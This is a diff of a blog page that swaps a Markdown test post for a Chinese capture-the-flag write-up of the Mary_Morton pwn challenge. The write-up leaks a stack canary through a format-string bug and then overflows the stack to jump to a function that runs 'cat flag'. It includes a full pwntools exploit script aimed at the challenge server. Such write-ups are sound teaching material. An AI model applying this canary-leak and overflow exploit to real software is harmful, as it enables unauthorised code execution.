@@ -6,20 +6,24 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>第一次用Markdown | HandsomeJack</title>
+  <title>攻防世界进阶区Mary_Morton | HandsomeJack</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="我就试试先试试字体我是斜体我是粗体我是又斜又粗的体">
-<meta name="keywords" content="随笔">
+  <meta name="description" content="[攻防世界]进阶区Mary_Morton进阶区另一个比较简单的题，没太多弯弯绕绕还是先查看文件看可利用的字符串发现system和cat flag已经组合好了，就在sub_4008DA函数里，只要跳转到这个而函数即可拿到flag看伪代码可以发现两个漏洞">
+<meta name="keywords" content="pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="第一次用Markdown">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;01&#x2F;18&#x2F;test&#x2F;index.html">
+<meta property="og:title" content="攻防世界进阶区Mary_Morton">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;18&#x2F;Mary_Morton&#x2F;index.html">
 <meta property="og:site_name" content="HandsomeJack">
-<meta property="og:description" content="我就试试先试试字体我是斜体我是粗体我是又斜又粗的体">
+<meta property="og:description" content="[攻防世界]进阶区Mary_Morton进阶区另一个比较简单的题，没太多弯弯绕绕还是先查看文件看可利用的字符串发现system和cat flag已经组合好了，就在sub_4008DA函数里，只要跳转到这个而函数即可拿到flag看伪代码可以发现两个漏洞">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https:&#x2F;&#x2F;imgconvert.csdnimg.cn&#x2F;aHR0cDovL2ltZy54aWF6YWl6aGlqaWEuY29tL3VwbG9hZHMvMjAxNi8xMjE1LzIwMTYxMjE1MDkzMjU1Njk5LmpwZw?x-oss-process=image&#x2F;format,png">
-<meta property="og:updated_time" content="2020-01-18T13:01:59.845Z">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;18&#x2F;Mary_Morton&#x2F;a.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;18&#x2F;Mary_Morton&#x2F;b.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;18&#x2F;Mary_Morton&#x2F;c.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;18&#x2F;Mary_Morton&#x2F;d.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;18&#x2F;Mary_Morton&#x2F;e.png">
+<meta property="og:updated_time" content="2020-02-18T02:29:26.297Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https:&#x2F;&#x2F;imgconvert.csdnimg.cn&#x2F;aHR0cDovL2ltZy54aWF6YWl6aGlqaWEuY29tL3VwbG9hZHMvMjAxNi8xMjE1LzIwMTYxMjE1MDkzMjU1Njk5LmpwZw?x-oss-process=image&#x2F;format,png">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;18&#x2F;Mary_Morton&#x2F;a.png">
   
     <link rel="alternative" href="/atom.xml" title="HandsomeJack" type="application/atom+xml">
   
@@ -184,59 +188,44 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-test" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-Mary_Morton" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      第一次用Markdown
+      攻防世界进阶区Mary_Morton
     </h1>
   
 
         
-        <a href="/2020/01/18/test/" class="archive-article-date">
-  	<time datetime="2020-01-18T06:20:00.134Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-18</time>
+        <a href="/2020/02/18/Mary_Morton/" class="archive-article-date">
+  	<time datetime="2020-02-18T02:05:36.868Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-18</time>
 </a>
         
       </header>
-<div align="center" class="post-count">字数：112字 | 预计阅读时长：1分钟</div>
+<div align="center" class="post-count">字数：431字 | 预计阅读时长：1分钟</div>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="我就试试"><a href="#我就试试" class="headerlink" title="我就试试"></a>我就试试</h1><h2 id="先试试字体"><a href="#先试试字体" class="headerlink" title="先试试字体"></a>先试试字体</h2><p><em>我是斜体</em><br><strong>我是粗体</strong><br><strong><em>我是又斜又粗的体</em></strong></p>
+        <h1 id="攻防世界-进阶区Mary-Morton"><a href="#攻防世界-进阶区Mary-Morton" class="headerlink" title="[攻防世界]进阶区Mary_Morton"></a>[攻防世界]进阶区Mary_Morton</h1><p>进阶区另一个比较简单的题，没太多弯弯绕绕<br>还是先查看文件<br><img src="a.png" alt="checksec和file查看"><br>看可利用的字符串<br><img src="b.png" alt=""><br>发现system和cat flag已经组合好了，就在sub_4008DA函数里，只要跳转到这个而函数即可拿到flag<br>看伪代码可以发现两个漏洞</p>
 <a id="more"></a>
-<h2 id="还行，再试试列表"><a href="#还行，再试试列表" class="headerlink" title="还行，再试试列表"></a>还行，再试试列表</h2><ol>
-<li>哦？</li>
-<li>嗯····</li>
-<li>奥！</li>
+<p>第一个是溢出漏洞<br><img src="c.png" alt=""><br>第二个是格式化字符串漏洞<br><img src="d.png" alt=""><br>由于这个程序开了canary，所以没法直接栈溢出，即单纯使用栈溢出不可行，而单纯利用格式化字符串漏洞也没法跳转到sub_4008DA函数，所以需要配合使用<br>先利用格式化字符串漏洞泄露canary值，再用栈溢出跳转到目的函数<br>先计算到canary的偏移：<br><img src="e.png" alt=""><br>到输入位置，即61616161的偏移是6，而buf到canary的距离是(0x90-0x8)，即0x88,8位为1字节，所以偏移是(0x88) / 8，即17，所以输入到canary的偏移就是6+17=23<br>之后用%23$p接收canary值，用得到的canary值栈溢出，跳转到sub_4008DA即可</p>
+<h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><ol>
+<li>用程序的第二个选项计算canary偏移</li>
+<li>利用得到的canary值，用程序第一个选项栈溢出</li>
+<li>栈溢出覆盖返回地址到0x4008DA</li>
+<li>拿到flag<h2 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h2></li>
 </ol>
-<ul>
-<li>嗯？</li>
-<li>哦~</li>
-<li>哈！</li>
-</ul>
-<h2 id="然后试试图片"><a href="#然后试试图片" class="headerlink" title="然后试试图片"></a>然后试试图片</h2><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy54aWF6YWl6aGlqaWEuY29tL3VwbG9hZHMvMjAxNi8xMjE1LzIwMTYxMjE1MDkzMjU1Njk5LmpwZw?x-oss-process=image/format,png" alt="一切尽在眼神中"></p>
-<h2 id="引用呢？"><a href="#引用呢？" class="headerlink" title="引用呢？"></a>引用呢？</h2><blockquote>
-<p>他望了她一眼,她对他回眸一笑,生命突然苏醒</p>
-</blockquote>
-<h2 id="然后是代码"><a href="#然后是代码" class="headerlink" title="然后是代码"></a>然后是代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">include&lt;iostream&gt;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">'6'</span>;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="表格？"><a href="#表格？" class="headerlink" title="表格？"></a>表格？</h2><table>
-        <tr>
-                <th>昨天</th>
-                <th>今天</th>
-                <th>明天</th>
-                <th>后天</th>
-        </tr>
-        <tr>
-                <th>0</th>
-                <th>1</th>
-                <th>2</th>
-                <th>3</th>
-        </tr>
-</table>
-
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">'111.198.29.45'</span>,<span class="number">45864</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">'3. Exit the battle'</span>,<span class="string">'2'</span>)</span><br><span class="line">r.sendline(<span class="string">'%23$p'</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">canary=int(r.recv(<span class="number">16</span>),<span class="number">16</span>) <span class="comment">#把接收到的16位转换成16进制的int型，再赋给canary</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">136</span>+p64(canary)+<span class="string">'a'</span>*<span class="number">8</span>+p64(<span class="number">0x4008DA</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'3. Exit the battle'</span>,<span class="string">'1'</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p>payload解释：</p>
+<ol>
+<li>‘a’*136：buf到canary的距离，0x88即136</li>
+<li>p64(canary)：之前泄露得到的canary的值</li>
+<li>‘a’*8：用于覆盖canary和ret之间的ebp</li>
+<li>p64(0x4008DA)：函数sub_4008DA的地址</li>
+</ol>
 
       
 
@@ -276,7 +265,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">随笔</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
         		</li>
       		
 		</ul>
@@ -332,7 +321,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://yoursite.com/2020/01/18/test/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://yoursite.com/2020/02/18/Mary_Morton/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -346,18 +335,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2020/01/31/hello_pwn/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          攻防世界新手区hello_pwn
-        
-      </div>
-    </a>
   
-  
-    <a href="/2019/11/01/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Hello World</div>
+    <a href="/2020/02/17/forgot/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">攻防世界进阶区forgot</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -384,7 +364,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#我就试试"><span class="toc-number">1.</span> <span class="toc-text">我就试试</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#先试试字体"><span class="toc-number">1.1.</span> <span class="toc-text">先试试字体</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#还行，再试试列表"><span class="toc-number">1.2.</span> <span class="toc-text">还行，再试试列表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#然后试试图片"><span class="toc-number">1.3.</span> <span class="toc-text">然后试试图片</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#引用呢？"><span class="toc-number">1.4.</span> <span class="toc-text">引用呢？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#然后是代码"><span class="toc-number">1.5.</span> <span class="toc-text">然后是代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#表格？"><span class="toc-number">1.6.</span> <span class="toc-text">表格？</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#攻防世界-进阶区Mary-Morton"><span class="toc-number">1.</span> <span class="toc-text">[攻防世界]进阶区Mary_Morton</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#思路："><span class="toc-number">1.1.</span> <span class="toc-text">思路：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP："><span class="toc-number">1.2.</span> <span class="toc-text">EXP：</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
@@ -409,7 +389,7 @@
 <script src="https://billts.site/js/gitment.js"></script>
 <script>
 var gitment = new Gitment({
-  id: "http://yoursite.com/2020/01/18/test/",
+  id: "http://yoursite.com/2020/02/18/Mary_Morton/",
   owner: 'SpHandsomeJack',
   repo: 'gitment-comment',
   oauth: {
